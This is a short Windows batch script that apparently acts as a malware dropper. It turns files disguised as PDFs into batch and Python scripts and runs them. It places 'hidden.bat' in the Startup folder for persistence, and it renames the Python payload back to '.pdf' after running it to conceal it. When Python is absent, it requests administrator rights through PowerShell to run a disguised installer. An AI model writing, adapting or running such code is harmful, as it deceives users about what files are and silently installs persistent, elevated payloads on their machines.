rename "hidden.pdf" "hidden.bat"
rename "python_installer.pdf" "python_installer.bat"
copy "tab.pdf" "%userprofile%\tab.pdf"
copy "hidden.bat" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
python --version >nul 2>&1
if %errorlevel% equ 0 (


	cd %userprofile%
	rename "%userprofile%\tab.pdf" "tab.py"
	"python.exe" "tab.py"
	rename "%userprofile%\tab.py" "tab.pdf"
) else (
	
	echo Requesting administrative privileges...
	NET FILE 1>NUL 2>NUL || powershell -Command "Start-Process 'python_installer.bat' -ArgumentList 'myfile.py' -Verb RunAs"
	echo Script execution complete.

)
pause
